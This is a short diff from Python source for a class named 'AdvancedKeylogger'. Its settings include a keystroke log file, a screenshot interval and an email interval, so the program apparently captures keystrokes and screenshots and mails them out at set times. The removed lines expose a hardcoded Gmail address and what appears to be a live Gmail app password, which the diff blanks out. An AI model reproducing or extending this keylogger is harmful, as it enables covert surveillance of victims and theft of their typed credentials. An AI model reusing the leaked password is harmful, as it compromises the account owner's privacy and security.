@@ -14,9 +14,8 @@ import sys
 LOG_FILE = "keys.log"
 SCREENSHOT_INTERVAL = 15      # segundos entre capturas
 EMAIL_INTERVAL = 30          # 5 minutos
-EMAIL_ADDRESS = "milipiliantonia12@gmail.com"          # ← CAMBIA ESTO
-EMAIL_PASSWORD = "kago stik tmxt ewwk"     # ← Contraseña de aplicación de Gmail
-
+EMAIL_ADDRESS =   ""       
+EMAIL_PASSWORD = ""
 class AdvancedKeylogger:
     def __init__(self):
         self.log_file = LOG_FILE
